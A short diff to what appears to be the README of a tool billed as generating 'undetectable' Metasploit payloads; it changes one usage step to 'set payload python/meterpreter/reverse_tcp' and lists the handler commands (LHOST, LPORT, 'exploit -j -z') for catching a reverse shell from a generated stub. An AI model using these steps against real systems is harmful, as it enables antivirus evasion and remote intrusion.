@@ -19,7 +19,7 @@ Generate Undetectable Metasploit Payload in a simple way
         2. Put IP & Port
         3. Stub.py Generated
         4. Now Start Metasploit
-        5. use payload python/meterpreter/reverse_tcp
+        5. set payload python/meterpreter/reverse_tcp
         6. set LHOST (ip)
         7. set LPORT (port)
         8. exploit -j -z
